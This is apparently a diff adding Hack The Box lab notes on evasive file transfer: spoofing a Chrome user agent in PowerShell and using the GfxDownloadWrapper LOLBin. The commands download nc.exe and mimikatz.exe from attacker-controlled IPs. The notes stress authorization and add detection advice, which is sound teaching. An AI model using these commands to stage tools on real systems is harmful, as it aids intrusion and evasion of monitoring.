@@ -1291,16 +1291,207 @@ Allowlisting known updater and browser traffic helps reduce noise, but user-agen
 
 ## 10. Evasive-testing considerations
 
-PowerShell permits changing the user agent used by `Invoke-WebRequest`:
+This section demonstrates how a file-transfer request can look different to a simple detection rule. These techniques must be explicitly authorized in the rules of engagement. Their purpose is to measure defensive controls in an HTB lab or approved assessment—not to conceal unapproved activity.
+
+### What changing a user agent does
+
+HTTP clients send a `User-Agent` header identifying the software that generated a request. PowerShell normally sends a recognizable Windows PowerShell value. `Invoke-WebRequest` allows the operator to replace that value with one resembling a browser.
+
+Changing the header affects only one network field. It does not hide:
+
+- The PowerShell process and command line
+- PowerShell Script Block, module, AMSI, or endpoint telemetry
+- The destination address and connection timing
+- DNS and proxy records
+- The file created on disk
+- The downloaded file's hash and later execution
+
+User-agent values are fully controlled by the client and are weak evidence when used alone.
+
+### Step 1: list PowerShell's built-in user agents
+
+Run on the authorized Windows target:
 
 ```powershell
-$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UserAgent $ua -OutFile 'C:\\Temp\\file.bin'
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
+    Select-Object Name,@{
+        Label="User Agent"
+        Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}
+    } | Format-List
 ```
 
-Changing a header may bypass a naive string rule, but it does not remove process, script, network, file, and behavioral evidence. Likewise, using a less common LOLBin may bypass a simple application rule while remaining detectable through behavior.
+PowerShell exposes values for Internet Explorer, Firefox, Chrome, Opera, and Safari. These values may represent older browser versions; selecting one does not make PowerShell behave like that browser.
 
-Evasion must be explicitly authorized in the rules of engagement. The purpose is to measure controls, not to hide unapproved activity. Coordinate with stakeholders, avoid destructive techniques, and preserve a complete tester activity log.
+### Step 2: select a Chrome user agent
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+```
+
+Inspect the value:
+
+```powershell
+$UserAgent
+```
+
+### Step 3: download with the selected user agent
+
+HTB's example:
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+Engagement-ready pattern:
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://PWNBOX_IP:8000/FILE_NAME -UserAgent $UserAgent -OutFile "C:\Users\Public\FILE_NAME"
+```
+
+| Parameter | Purpose |
+|---|---|
+| `-UserAgent $UserAgent` | Replaces the request's default User-Agent header |
+| `-OutFile` | Saves the response body to the selected local path |
+| `PWNBOX_IP` | VPN address of the approved file server |
+| `FILE_NAME` | Harmless lab file being transferred |
+
+### Step 4: observe the request header
+
+HTB uses Netcat on the Pwnbox to display the raw request:
+
+```bash
+sudo nc -lvnp 80
+```
+
+When the Windows request arrives, the Pwnbox displays a header similar to:
+
+```http
+GET /nc.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
+Host: PWNBOX_IP
+Connection: Keep-Alive
+```
+
+This Netcat listener is useful for inspecting the request but is not a complete HTTP file server. Use a real approved HTTP server when the objective is a successful download.
+
+### Hands-on user-agent exercise
+
+#### 1. Prepare a harmless file on Pwnbox
+
+```bash
+mkdir -p "$HOME/section10-lab"
+cd "$HOME/section10-lab"
+echo "HTB Section 10 authorized transfer test" > section10-test.txt
+python3 -m http.server 8000
+```
+
+Leave the HTTP server running and determine the Pwnbox VPN address in another terminal:
+
+```bash
+ip -br addr show tun0
+```
+
+#### 2. Download from the Windows target
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://PWNBOX_IP:8000/section10-test.txt -UserAgent $UserAgent -OutFile "C:\Users\Public\section10-test.txt"
+```
+
+#### 3. Verify the actual result
+
+```powershell
+Get-Item "C:\Users\Public\section10-test.txt"
+Get-Content "C:\Users\Public\section10-test.txt"
+```
+
+Expected content:
+
+```text
+HTB Section 10 authorized transfer test
+```
+
+The successful transfer proves that the request worked. It does not prove that it evaded endpoint or network monitoring.
+
+### LOLBAS and GTFOBins
+
+**LOLBAS** catalogs Windows binaries whose legitimate functionality can perform actions such as file download, upload, execution, read, or write. **GTFOBins** catalogs equivalent capabilities in Unix-like binaries.
+
+These are sometimes called living-off-the-land or misplaced-trust binaries. Their presence can provide an alternative when PowerShell, Netcat, or another tool is unavailable or blocked. A signed or built-in binary does not make the resulting behavior trusted or invisible.
+
+### GfxDownloadWrapper example
+
+HTB provides this example for systems containing Intel's `GfxDownloadWrapper.exe`:
+
+```powershell
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
+General authorized-lab pattern:
+
+```powershell
+GfxDownloadWrapper.exe "http://PWNBOX_IP:8000/FILE_NAME" "C:\Temp\FILE_NAME"
+```
+
+Before attempting it, confirm the binary actually exists:
+
+```powershell
+Get-Command GfxDownloadWrapper.exe -ErrorAction SilentlyContinue
+```
+
+If the command returns nothing, the binary is not available through the current path. Do not introduce arbitrary binaries merely to claim living-off-the-land behavior; select a documented binary already present on the system and permitted by scope.
+
+### Engagement decision process
+
+| Situation | Action |
+|---|---|
+| Normal approved HTTP client works | Use the simplest authorized transfer method |
+| A control intentionally blocks a method | Record the block and test an alternative only if evasion testing is authorized |
+| Candidate LOLBin exists | Confirm its documented transfer function and test with a harmless file |
+| Candidate binary is absent | Choose another present, approved method rather than installing it silently |
+| Download succeeds | Verify the file and record process, network, and file telemetry |
+| EDR or policy blocks the action | Treat the block as an assessment result; do not disable controls without explicit approval |
+
+### Defensive interpretation
+
+Defenders should not trust user-agent strings as proof of application identity. Stronger detections correlate:
+
+- The initiating executable and parent process
+- Full command-line and PowerShell telemetry
+- Rare outbound destinations
+- File creation followed by execution
+- A signed utility performing behavior unusual for its normal role
+- First-seen tool, destination, path, or protocol combinations
+
+### Verification checklist
+
+- The source URL belongs to the authorized lab.
+- The destination path is inside approved scope.
+- The request used the selected User-Agent value.
+- The expected file was created.
+- The file contents or hash match the source.
+- Tester activity and timestamps were recorded.
+- Any defensive alert or block was preserved as evidence.
+
+### Cleanup
+
+Remove only the harmless test artifact created by the exercise:
+
+```powershell
+Remove-Item "C:\Users\Public\section10-test.txt" -ErrorAction SilentlyContinue
+```
+
+Stop the temporary Python server on Pwnbox with `Ctrl+C`. Preserve logs and assessment evidence required by the rules of engagement.
+
+### Key takeaways
+
+- Changing a User-Agent modifies a header; it does not make PowerShell invisible.
+- LOLBAS and GTFOBins are references for capabilities in binaries already present on a system.
+- Use alternatives only when permitted by the assessment scope.
+- A defensive block is a valid finding, not permission to disable the control.
+- Practice different transfer methods so that selection is based on constraints rather than habit.
 
 ---
 
